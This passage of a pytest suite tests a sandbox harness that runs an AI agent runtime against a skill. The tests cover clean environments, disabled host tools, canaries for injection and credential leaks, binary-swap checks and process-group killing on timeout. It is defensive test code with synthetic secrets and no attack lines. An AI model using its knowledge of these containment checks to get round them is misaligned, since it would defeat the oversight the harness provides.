            )
            node_source.chmod(node_source.stat().st_mode | stat.S_IXUSR)
        return fake.popen(args, **kwargs)

    result = HarnessAgentRuntimeRunner(popen_factory=swap_then_spawn).run(
        config=config,
        snapshot=skill_snapshot.snapshot,
        file_bytes=skill_snapshot.file_bytes,
        skill_name="fixture-skill",
    )
    assert swapped is True
    assert result.status == "completed"
    assert not execution_marker.exists()
    assert fake.version_invocations[0]["args"][0] != str(node_source)


def test_runner_private_dsh_capsule_preserves_local_and_bare_module_resolution(
    tmp_path, skill_snapshot
):
    node = Path(shutil.which("node")).resolve()
    package_root = tmp_path / "node_modules" / "@deepseek-ai" / "dsh"
    lib = package_root / "lib"
    dependency = package_root / "node_modules" / "fixture-dependency"
    lib.mkdir(parents=True)
    dependency.mkdir(parents=True)
    (package_root / "package.json").write_text(
        json.dumps(
            {
                "name": "@deepseek-ai/dsh",
                "version": "0.1.1-rc.2",
                "type": "module",
            }
        ),
        encoding="utf-8",
    )
    (lib / "local-chunk.js").write_text(
        "export const localValue = 'local-chunk'\n",
        encoding="utf-8",
    )
    (dependency / "package.json").write_text(
        json.dumps(
            {
                "name": "fixture-dependency",
                "exports": "./index.js",
                "type": "module",
            }
        ),
        encoding="utf-8",
    )
    (dependency / "index.js").write_text(
        "export const dependencyValue = 'bare-dependency'\n",
        encoding="utf-8",
    )
    entry = lib / "bin.js"
    entry.write_text(
        textwrap.dedent(
            """\
            import { appendFileSync } from 'node:fs'
            import { localValue } from './local-chunk.js'
            import { dependencyValue } from 'fixture-dependency'

            if (process.argv.slice(2).length === 1 && process.argv[2] === '--version') {
              console.log('0.1.1-rc.2')
            } else {
              appendFileSync(
                process.env.VERITY_AGENT_RUNTIME_TRACE,
                JSON.stringify({ skill_loaded: true }) + '\\n' +
                  JSON.stringify({
                    tool_name: 'read_file',
                    target_class: 'project_public',
                    outcome: 'completed',
                    canary_present: false,
                  }) + '\\n',
              )
              console.log(`${localValue}:${dependencyValue}`)
            }
            """
        ),
        encoding="utf-8",
    )
    config = AgentRuntimeConfig(
        enabled=True,
        dsh_executable=str(entry),
        dsh_sha256=hashlib.sha256(entry.read_bytes()).hexdigest(),
        node_executable=str(node),
        node_sha256=hashlib.sha256(node.read_bytes()).hexdigest(),
        base_url="https://model.example.invalid/v1",
        model_id="offline-fixture-model",
        scenario_ids=("agent_primary_task",),
    )
    source_swapped = False

    def swap_source_then_spawn(args, **kwargs):
        nonlocal source_swapped
        if "--version" not in args and not source_swapped:
            source_swapped = True
            entry.write_text("throw new Error('source entry executed')\n", encoding="utf-8")
        return subprocess.Popen(args, **kwargs)

    result = HarnessAgentRuntimeRunner(
        popen_factory=swap_source_then_spawn
    ).run(
        config=config,
        snapshot=skill_snapshot.snapshot,
        file_bytes=skill_snapshot.file_bytes,
        skill_name="fixture-skill",
    )
    assert source_swapped is True
    assert result.status == "completed"
    assert result.reasonCode is None
    assert len(result.scenarioResults) == 1
    assert result.scenarioResults[0].tool_events == (
        AgentRuntimeToolEvent(
            tool_name="read_file",
            target_class="project_public",
            outcome="completed",
            canary_present=False,
        ),
    )


def test_runner_launches_private_pinned_snapshots_and_minimal_environment(
    fake_dsh, skill_snapshot
):
    result = run_with_fake_dsh(
        fake_dsh,
        skill_snapshot,
        scenario_ids=("agent_primary_task",),
    )
    invocation = fake_dsh.invocations[0]
    assert invocation["args"][0] != str(fake_dsh.node_path)
    assert invocation["args"][1] != str(fake_dsh.path)
    assert Path(invocation["args"][0]).name == "node"
    assert Path(invocation["args"][1]).name == "dsh-entry.mjs"
    assert invocation["env"]["PATH"] == "/usr/bin:/bin"
    assert invocation["env"]["DSH_PERMISSION_MODE"] == "read-only"
    assert "HOME" not in invocation["env"]
    assert result.status == "completed"


def test_credentials_are_absent_from_version_and_remapped_to_fixed_child_name(
    tmp_path, skill_snapshot, monkeypatch
):
    source_name = "VERITY_TEST_PARENT_KEY"
    synthetic_value = "synthetic-parent-secret"
    monkeypatch.setenv(source_name, synthetic_value)
    tool_root = tmp_path / "credential-tool"
    tool_root.mkdir()
    credential_dsh = _FakeDsh(
        tool_root,
        credential_source_name=source_name,
        credential_expected=synthetic_value,
    )
    result = run_with_fake_dsh(
        credential_dsh,
        skill_snapshot,
        credentials=AgentRuntimeCredentials(api_key_env=source_name),
        scenario_ids=("agent_primary_task",),
    )
    assert result.status == "completed"
    scenario_env = credential_dsh.invocations[0]["env"]
    # The fake exits 30 during --version if either credential name is present.
    assert source_name not in scenario_env
    assert scenario_env["VERITY_AGENT_RUNTIME_API_KEY"] == synthetic_value
    patch = credential_dsh.invocations[0]["patch"]
    assert "apiKeyEnv: \"VERITY_AGENT_RUNTIME_API_KEY\"" in patch
    assert source_name not in patch


def test_runner_uses_clean_env_fresh_temp_roots_and_no_shell(
    fake_dsh, skill_snapshot, monkeypatch
):
    monkeypatch.setenv("VERITY_PARENT_SECRET", "must-not-cross")
    result = run_with_fake_dsh(fake_dsh, skill_snapshot)
    invocation = fake_dsh.invocations[0]
    assert invocation["shell"] is False
    assert "VERITY_PARENT_SECRET" not in invocation["env"]
    assert invocation["env"]["DSH_TELEMETRY_MODE"] == "DISABLED"
    assert invocation["cwd_entries"] == ()
    assert result.status == "completed"
    assert not Path(invocation["dsh_home"]).exists()
    assert not Path(invocation["agents_home"]).exists()
    assert len({item["dsh_home"] for item in fake_dsh.invocations}) == 2


def test_runner_patch_disables_host_capabilities_and_keeps_only_isolated_skill(
    fake_dsh, skill_snapshot
):
    result = run_with_fake_dsh(fake_dsh, skill_snapshot)
    patch = fake_dsh.invocations[0]["patch"]
    for disabled_id in (
        "session-persistence-jsonl",
        "session-telemetry-otel",
        "subprocess",
        "sandbox",
        "tool-bash",
        "tool-pwsh",
        "tool-jobs",
        "tool-fs",
        "tool-fs-search",
        "tool-web",
        "code-runtime",
        "tool-workflow",
        "tool-subagent",
        "tool-goal",
        "tool-todo",
        "tool-ralph",
        "agent-instructions",
    ):
        assert f"- id: {disabled_id}\n  disabled: true" in patch
    assert "includeDefaultRoots: false" in patch
    assert "customSkillDirs:" in patch
    assert "mode: native" in patch
    assert "id: verity-runtime-plugin" in patch
    assert 'skillName: "fixture-skill"' in patch
    injection_match = re.search(r'injectionCanary: "([^"]+)"', patch)
    credential_match = re.search(r'credentialCanary: "([^"]+)"', patch)
    assert injection_match is not None
    assert credential_match is not None
    assert injection_match.group(1) != credential_match.group(1)
    assert "FAKE" in credential_match.group(1)
    assert "\n        canary:" not in patch
    assert result.status == "completed"


def test_timeout_kills_the_process_group_and_returns_no_raw_output(
    hanging_dsh, skill_snapshot
):
    result = run_with_fake_dsh(
        hanging_dsh,
        skill_snapshot,
        timeout_seconds=0.1,
        scenario_ids=("agent_primary_task",),
    )
    assert result.status == "timeout"
    assert result.reasonCode == "agent_runtime_wall_clock_exceeded"
    assert "secret model output" not in repr(result)


def test_version_probe_times_out_without_retaining_raw_output(
    tmp_path, skill_snapshot, monkeypatch
):
    tool_root = tmp_path / "version-timeout-tool"
    tool_root.mkdir()
    fake = _FakeDsh(tool_root, version_hangs=True)
    monkeypatch.setattr(runtime_runner, "_VERSION_TIMEOUT_SECONDS", 0.1)
    result = run_with_fake_dsh(fake, skill_snapshot)
    assert result.status == "failed"
    assert result.reasonCode == "dsh_version_check_timeout"
    assert "secret" not in repr(result)
    assert fake.scenario_invocations == 0


def test_version_probe_output_overflow_kills_process_group(
    tmp_path, skill_snapshot
):
    tool_root = tmp_path / "version-overflow-tool"
    tool_root.mkdir()
    fake = _FakeDsh(tool_root, version_output_bytes=4096)
    result = run_with_fake_dsh(fake, skill_snapshot)
    assert result.status == "failed"
    assert result.reasonCode == "dsh_version_output_exceeded"
    assert fake.scenario_invocations == 0


def test_scenario_streams_output_without_temporary_files(
    tmp_path, skill_snapshot, monkeypatch
):
    tool_root = tmp_path / "stream-tool"
    tool_root.mkdir()
    fake = _FakeDsh(tool_root, scenario_output_bytes=4096)

    def reject_temporary_file(*args, **kwargs):
        raise AssertionError("raw output must not be persisted to a temporary file")

    monkeypatch.setattr(runtime_runner.tempfile, "TemporaryFile", reject_temporary_file)
    result = run_with_fake_dsh(
        fake,
        skill_snapshot,
        max_stdout_bytes=128,
        scenario_ids=("agent_primary_task",),
    )
    assert result.status == "failed"
    assert result.reasonCode == "agent_runtime_stdout_limit_exceeded"
    assert result.truncated["stdout"] is True


@pytest.mark.skipif(os.name != "posix", reason="requires POSIX process groups")
def test_timeout_kills_spawned_descendant(tmp_path, skill_snapshot):
    descendant_pid_path = tmp_path / "descendant.pid"
    tool_root = tmp_path / "descendant-tool"
    tool_root.mkdir()
    fake = _FakeDsh(tool_root, descendant_pid_path=descendant_pid_path)
    result = run_with_fake_dsh(
        fake,
        skill_snapshot,
        timeout_seconds=0.8,
        scenario_ids=("agent_primary_task",),
    )
    assert result.status == "timeout"
    descendant_pid = int(descendant_pid_path.read_text(encoding="ascii"))
    deadline = time.monotonic() + 2
    while time.monotonic() < deadline:
        completed = subprocess.run(
            ["ps", "-o", "stat=", "-p", str(descendant_pid)],
            capture_output=True,
            text=True,
            check=False,
        )
        if completed.returncode != 0 or completed.stdout.strip().startswith("Z"):
            break
        time.sleep(0.02)
    assert completed.returncode != 0 or completed.stdout.strip().startswith("Z")


@pytest.mark.skipif(os.name != "posix", reason="requires POSIX process groups")
def test_stdout_overflow_kills_descendant_after_parent_exits(tmp_path, skill_snapshot):
    descendant_pid_path = tmp_path / "overflow-descendant.pid"
    tool_root = tmp_path / "overflow-descendant-tool"
    tool_root.mkdir()
    fake = _FakeDsh(
        tool_root,
        overflow_descendant_pid_path=descendant_pid_path,
    )
    result = run_with_fake_dsh(
        fake,
        skill_snapshot,
        timeout_seconds=2,
        max_stdout_bytes=128,
        scenario_ids=("agent_primary_task",),
    )
    assert result.status == "failed"
    assert result.reasonCode == "agent_runtime_stdout_limit_exceeded"
    descendant_pid = int(descendant_pid_path.read_text(encoding="ascii"))
    completed = subprocess.run(
        ["ps", "-o", "stat=", "-p", str(descendant_pid)],
        capture_output=True,
        text=True,
        check=False,
    )
    assert completed.returncode != 0 or completed.stdout.strip().startswith("Z")


@pytest.mark.skipif(os.name != "posix", reason="requires POSIX process groups")
@pytest.mark.parametrize(
    ("group_state", "expected_reason", "expected_eperm_probes"),
    [
        ("zombie_only", "agent_runtime_stdout_limit_exceeded", 1),
        ("absent_candidate", "agent_runtime_process_control_failed", 2),
        ("live_or_mixed", "agent_runtime_process_control_failed", 1),
        ("unknown", "agent_runtime_process_control_failed", 1),
    ],
)
def test_stdout_overflow_eperm_probe_only_accepts_proven_quiescent_group(
    tmp_path,
    skill_snapshot,
    monkeypatch,
    group_state,
    expected_reason,
    expected_eperm_probes,
):
    descendant_pid_path = tmp_path / "overflow-eperm-descendant.pid"
    tool_root = tmp_path / "overflow-eperm-descendant-tool"
    tool_root.mkdir()
    fake = _FakeDsh(
        tool_root,
        overflow_descendant_pid_path=descendant_pid_path,
    )
    real_killpg = os.killpg
    killed_groups = set()
    eperm_probes = []

    def macos_killpg(process_group_id, requested_signal):
        if requested_signal == signal.SIGKILL:
            real_killpg(process_group_id, requested_signal)
            killed_groups.add(process_group_id)
            return
        if requested_signal == 0 and process_group_id in killed_groups:
            eperm_probes.append(process_group_id)
            raise PermissionError(errno.EPERM, "zombie-only process group")
        real_killpg(process_group_id, requested_signal)

    monkeypatch.setattr(runtime_runner.os, "killpg", macos_killpg)
    monkeypatch.setattr(
        HarnessAgentRuntimeRunner,
        "_process_group_state",
        staticmethod(lambda _process_group_id: group_state),
        raising=False,
    )

    result = run_with_fake_dsh(
        fake,
        skill_snapshot,
        timeout_seconds=2,
        max_stdout_bytes=128,
        scenario_ids=("agent_primary_task",),
    )

    assert result.status == "failed"
    assert result.reasonCode == expected_reason
    assert result.scenarioResults[0].reason_codes == (expected_reason,)
    assert result.truncated["stdout"] is True
    assert len(eperm_probes) == expected_eperm_probes


@pytest.mark.skipif(os.name != "posix", reason="requires POSIX process groups")
def test_stdout_overflow_eperm_then_absent_group_preserves_limit_reason(
    tmp_path, skill_snapshot, monkeypatch
):
    descendant_pid_path = tmp_path / "overflow-disappearing-descendant.pid"
    tool_root = tmp_path / "overflow-disappearing-descendant-tool"
    tool_root.mkdir()
    fake = _FakeDsh(
        tool_root,
        overflow_descendant_pid_path=descendant_pid_path,
    )
    real_killpg = os.killpg
    scenario_group = None
    scenario_signals = []

    def disappearing_group_killpg(process_group_id, requested_signal):
        nonlocal scenario_group
        if scenario_group is None and requested_signal == signal.SIGKILL:
            real_killpg(process_group_id, requested_signal)
            scenario_group = process_group_id
            scenario_signals.append(requested_signal)
            return
        if process_group_id != scenario_group:
            real_killpg(process_group_id, requested_signal)
            return
        scenario_signals.append(requested_signal)
        if requested_signal == signal.SIGKILL:
            return
        probe_number = scenario_signals.count(0)
        if probe_number == 1:
            return
        if probe_number == 2:
            raise PermissionError(errno.EPERM, "zombie process group")
        raise ProcessLookupError(errno.ESRCH, "process group disappeared")

    monkeypatch.setattr(runtime_runner.os, "killpg", disappearing_group_killpg)
    monkeypatch.setattr(
        HarnessAgentRuntimeRunner,
        "_process_group_state",
        staticmethod(lambda _process_group_id: "absent_candidate"),
        raising=False,
    )

    result = run_with_fake_dsh(
        fake,
        skill_snapshot,
        timeout_seconds=2,
        max_stdout_bytes=128,
        scenario_ids=("agent_primary_task",),
    )

    assert result.status == "failed"
    assert result.reasonCode == "agent_runtime_stdout_limit_exceeded"
    assert result.scenarioResults[0].reason_codes == (
        "agent_runtime_stdout_limit_exceeded",
    )
    assert result.truncated["stdout"] is True
    assert scenario_signals == [signal.SIGKILL, 0, signal.SIGKILL, 0, 0]


@pytest.mark.skipif(os.name != "posix", reason="requires POSIX process groups")
def test_stdout_overflow_second_kill_eperm_then_absent_group_preserves_limit(
    tmp_path, skill_snapshot, monkeypatch
):
    descendant_pid_path = tmp_path / "overflow-second-kill-descendant.pid"
    tool_root = tmp_path / "overflow-second-kill-descendant-tool"
    tool_root.mkdir()
    fake = _FakeDsh(
        tool_root,
        overflow_descendant_pid_path=descendant_pid_path,
    )
    real_killpg = os.killpg
    scenario_group = None
    scenario_signals = []

    def second_kill_eperm(process_group_id, requested_signal):
        nonlocal scenario_group
        if scenario_group is None and requested_signal == signal.SIGKILL:
            real_killpg(process_group_id, requested_signal)
            scenario_group = process_group_id
            scenario_signals.append(requested_signal)
            return
        if process_group_id != scenario_group:
            real_killpg(process_group_id, requested_signal)
            return
        scenario_signals.append(requested_signal)
        if scenario_signals == [signal.SIGKILL, 0]:
            return
        if requested_signal == signal.SIGKILL:
            raise PermissionError(errno.EPERM, "zombie process group")
        raise ProcessLookupError(errno.ESRCH, "process group disappeared")

    monkeypatch.setattr(runtime_runner.os, "killpg", second_kill_eperm)
    monkeypatch.setattr(
        HarnessAgentRuntimeRunner,
        "_process_group_state",
        staticmethod(lambda _process_group_id: "absent_candidate"),
        raising=False,
    )

    result = run_with_fake_dsh(
        fake,
        skill_snapshot,
        timeout_seconds=2,
        max_stdout_bytes=128,
        scenario_ids=("agent_primary_task",),
    )

    assert result.status == "failed"
    assert result.reasonCode == "agent_runtime_stdout_limit_exceeded"
    assert result.scenarioResults[0].reason_codes == (
        "agent_runtime_stdout_limit_exceeded",
    )
    assert result.truncated["stdout"] is True
    assert scenario_signals == [signal.SIGKILL, 0, signal.SIGKILL, 0]


@pytest.mark.skipif(os.name != "posix", reason="requires POSIX process groups")
def test_stdout_overflow_force_kill_eperm_then_absent_group_preserves_limit(
    tmp_path, skill_snapshot, monkeypatch
):
    descendant_pid_path = tmp_path / "overflow-force-kill-descendant.pid"
    tool_root = tmp_path / "overflow-force-kill-descendant-tool"
    tool_root.mkdir()
    fake = _FakeDsh(
        tool_root,
        overflow_descendant_pid_path=descendant_pid_path,
    )
    real_killpg = os.killpg
    scenario_group = None
    scenario_signals = []

    def force_kill_eperm(process_group_id, requested_signal):
        nonlocal scenario_group
        if scenario_group is None and requested_signal == signal.SIGKILL:
            real_killpg(process_group_id, requested_signal)
            scenario_group = process_group_id
            scenario_signals.append(requested_signal)
            raise PermissionError(errno.EPERM, "zombie process group")
        if process_group_id != scenario_group:
            real_killpg(process_group_id, requested_signal)
            return
        scenario_signals.append(requested_signal)
        raise ProcessLookupError(errno.ESRCH, "process group disappeared")

    monkeypatch.setattr(runtime_runner.os, "killpg", force_kill_eperm)
    monkeypatch.setattr(
        HarnessAgentRuntimeRunner,
        "_process_group_state",
        staticmethod(lambda _process_group_id: "absent_candidate"),
        raising=False,
    )

    result = run_with_fake_dsh(
        fake,
        skill_snapshot,
        timeout_seconds=2,
        max_stdout_bytes=128,
        scenario_ids=("agent_primary_task",),
    )

    assert result.status == "failed"
    assert result.reasonCode == "agent_runtime_stdout_limit_exceeded"
    assert result.scenarioResults[0].reason_codes == (
        "agent_runtime_stdout_limit_exceeded",
    )
    assert result.truncated["stdout"] is True
    assert scenario_signals == [signal.SIGKILL, 0, 0]


@pytest.mark.parametrize(
    ("return_code", "stdout", "expected_state"),
    [
        (0, b"Z\n", "zombie_only"),
        (0, b"Z+\nZ\n", "zombie_only"),
        (1, b"", "absent_candidate"),
        (1, b" \n", "absent_candidate"),
        (0, b"S\n", "live_or_mixed"),
        (0, b"Z\nR+\n", "live_or_mixed"),
        (0, b"", "unknown"),
        (0, b"Q\n", "unknown"),
        (1, b"S\n", "unknown"),
        (2, b"", "unknown"),
    ],
)
def test_macos_process_group_state_probe_preserves_fail_closed_states(
    monkeypatch, return_code, stdout, expected_state
):
    completed = subprocess.CompletedProcess(
        args=("/bin/ps",),
        returncode=return_code,
        stdout=stdout,
    )
    monkeypatch.setattr(runtime_runner.sys, "platform", "darwin")
    monkeypatch.setattr(
        runtime_runner.subprocess,
        "run",
        lambda *args, **kwargs: completed,
    )

    assert (
        HarnessAgentRuntimeRunner._process_group_state(1234) == expected_state
    )


def test_macos_process_group_state_probe_failure_is_unknown(monkeypatch):
    def fail_probe(*args, **kwargs):
        raise subprocess.TimeoutExpired(cmd="/bin/ps", timeout=0.5)

    monkeypatch.setattr(runtime_runner.sys, "platform", "darwin")
    monkeypatch.setattr(runtime_runner.subprocess, "run", fail_probe)

    assert HarnessAgentRuntimeRunner._process_group_state(1234) == "unknown"


@pytest.mark.skipif(os.name != "posix", reason="requires POSIX process groups")
@pytest.mark.parametrize("spawn_during_version", [False, True])
def test_normal_parent_exit_cleans_same_group_descendants(
    tmp_path, skill_snapshot, spawn_during_version
):
    descendant_pid_path = tmp_path / "normal-exit-descendant.pid"
    tool_root = tmp_path / "normal-exit-descendant-tool"
    tool_root.mkdir()
    fake = _FakeDsh(
        tool_root,
        normal_exit_descendant_pid_path=(
            None if spawn_during_version else descendant_pid_path
        ),
        version_descendant_pid_path=(
            descendant_pid_path if spawn_during_version else None
        ),
    )
    descendant_pid = None
    try:
        result = run_with_fake_dsh(
            fake,
            skill_snapshot,
            scenario_ids=("agent_primary_task",),
        )
        assert result.status == "completed"
        descendant_pid = int(descendant_pid_path.read_text(encoding="ascii"))
        completed = subprocess.run(
            ["ps", "-o", "stat=", "-p", str(descendant_pid)],
            capture_output=True,
            text=True,
            check=False,
        )
        assert completed.returncode != 0
    finally:
        if descendant_pid is not None:
            try:
                os.kill(descendant_pid, 9)
            except ProcessLookupError:
                pass


def _stage_direct(tmp_path, fake_dsh, snapshot, file_bytes):
    runtime_root = tmp_path / "runtime-root"
    runtime_root.mkdir()
    runner = HarnessAgentRuntimeRunner(popen_factory=fake_dsh.popen)
    return runner._stage_runtime(
        runtime_root,
        enabled_config(fake_dsh),
        snapshot,
        file_bytes,
        "fixture-skill",
    )


def test_staging_preflights_all_digests_before_writing(
    tmp_path, fake_dsh, skill_snapshot
):
    original = skill_snapshot.snapshot.files[0]
    second = replace(
        original,
        fileId="f-second",
        normalizedPath="references/info.txt",
        contentDigest="0" * 64,
    )
    snapshot = replace(skill_snapshot.snapshot, files=[original, second])
    file_bytes = dict(skill_snapshot.file_bytes)
    file_bytes[second.fileId] = file_bytes[original.fileId]
    runtime_root = tmp_path / "runtime-root"
    runtime_root.mkdir()
    runner = HarnessAgentRuntimeRunner(popen_factory=fake_dsh.popen)
    with pytest.raises(ValueError, match="agent_runtime_snapshot_digest_mismatch"):
        runner._stage_runtime(
            runtime_root,
            enabled_config(fake_dsh),
            snapshot,
            file_bytes,
            "fixture-skill",
        )
    staged_skill = runtime_root / "isolated-skills" / "fixture-skill"
    assert not (staged_skill / "SKILL.md").exists()


def test_runner_contains_non_string_normalized_path_as_staging_failure(
    fake_dsh, skill_snapshot
):
    malformed_file = replace(
        skill_snapshot.snapshot.files[0],
        normalizedPath=None,
    )
    snapshot = replace(skill_snapshot.snapshot, files=[malformed_file])
    result = HarnessAgentRuntimeRunner(popen_factory=fake_dsh.popen).run(
        config=enabled_config(fake_dsh),
        snapshot=snapshot,
        file_bytes=skill_snapshot.file_bytes,
        skill_name="fixture-skill",
    )
    assert result.status == "failed"
    assert result.reasonCode == "agent_runtime_snapshot_path_invalid"
    assert fake_dsh.scenario_invocations == 0


def test_runner_contains_malformed_snapshot_collection_as_staging_failure(
    fake_dsh, skill_snapshot
):
    snapshot = replace(skill_snapshot.snapshot, files=None)
    result = HarnessAgentRuntimeRunner(popen_factory=fake_dsh.popen).run(
        config=enabled_config(fake_dsh),
        snapshot=snapshot,
        file_bytes=skill_snapshot.file_bytes,
        skill_name="fixture-skill",
    )
    assert result.status == "failed"
    assert result.reasonCode == "agent_runtime_staging_failed"
    assert fake_dsh.scenario_invocations == 0


@pytest.mark.parametrize(
    ("first_path", "second_path", "reason"),
    [
        ("Docs/Info.txt", "docs/info.TXT", "agent_runtime_snapshot_path_collision"),
        ("references", "references/info.txt", "agent_runtime_snapshot_parent_collision"),
    ],
)
def test_staging_rejects_casefold_and_parent_file_collisions(
    tmp_path, fake_dsh, skill_snapshot, first_path, second_path, reason
):
    original = skill_snapshot.snapshot.files[0]
    data = skill_snapshot.file_bytes[original.fileId]
    first = replace(original, fileId="f-first", normalizedPath=first_path)
    second = replace(original, fileId="f-second", normalizedPath=second_path)
    snapshot = replace(skill_snapshot.snapshot, files=[first, second])
    with pytest.raises(ValueError, match=reason):
        _stage_direct(
            tmp_path,
            fake_dsh,
            snapshot,
            {first.fileId: data, second.fileId: data},
        )


def test_staging_uses_exclusive_no_follow_file_creation(
    tmp_path, fake_dsh, skill_snapshot, monkeypatch
):
    real_open = runtime_runner.os.open
    observed_flags = []

    def recording_open(path, flags, mode=0o777):
        observed_flags.append(flags)
        return real_open(path, flags, mode)

    monkeypatch.setattr(runtime_runner.os, "open", recording_open)
    paths = _stage_direct(
        tmp_path,
        fake_dsh,
        skill_snapshot.snapshot,
        skill_snapshot.file_bytes,
    )
    assert (paths.skill_root / "fixture-skill" / "SKILL.md").is_file()
    assert any(flags & os.O_EXCL for flags in observed_flags)
    if hasattr(os, "O_NOFOLLOW"):
        assert any(flags & os.O_NOFOLLOW for flags in observed_flags)
